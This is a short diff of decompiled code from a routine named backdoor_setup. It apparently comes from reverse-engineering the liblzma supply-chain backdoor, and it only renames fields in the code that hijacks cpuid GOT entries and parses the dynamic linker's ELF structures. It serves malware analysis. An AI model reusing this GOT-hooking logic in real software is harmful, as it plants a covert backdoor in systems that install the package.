@@ -135,7 +135,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   code_segment = (peVar49->got_ctx).got_ptr;
   if (code_segment != (void *)0x0) {
     cpuid_got_entry = *(u64 **)((long)code_segment + (long)(peVar49->got_ctx).cpuid_fn * 8 + 0x18);
-    frame_address = peVar49->frame_address;
+    frame_address = peVar49->resolver_frame;
     loop_idx = (long)frame_address - (long)cpuid_got_entry;
     if (frame_address <= cpuid_got_entry) {
       loop_idx = (long)cpuid_got_entry - (long)frame_address;
@@ -147,7 +147,7 @@ LAB_00105951:
       EVar25 = get_string_id((char *)string_begin,(char *)0x0);
       if (EVar25 != STR_ELF) goto code_r0x00105962;
       local_a88.__libc_stack_end = &local_aa8;
-      local_a70 = params->entry_ctx->frame_address;
+      local_a70 = params->entry_ctx->resolver_frame;
       local_a88.elf_handles = elf_handles;
       local_a88.dynamic_linker_ehdr = string_begin;
       BVar26 = main_elf_parse(&local_a88);
@@ -876,7 +876,7 @@ LAB_00105a81:
   (peVar49->got_ctx).return_address = (void *)0x0;
   (peVar49->got_ctx).cpuid_fn = (void *)0x0;
   (peVar49->got_ctx).got_offset = 0;
-  peVar49->symbol_ptr = (void *)0x1;
+  peVar49->cpuid_random_symbol_addr = (void *)0x1;
   tls_slot = (int *)cpuid_basic_info(0);
   if (*tls_slot != 0) {
     resolved_count_cursor = (undefined4 *)cpuid_Version_info(1);
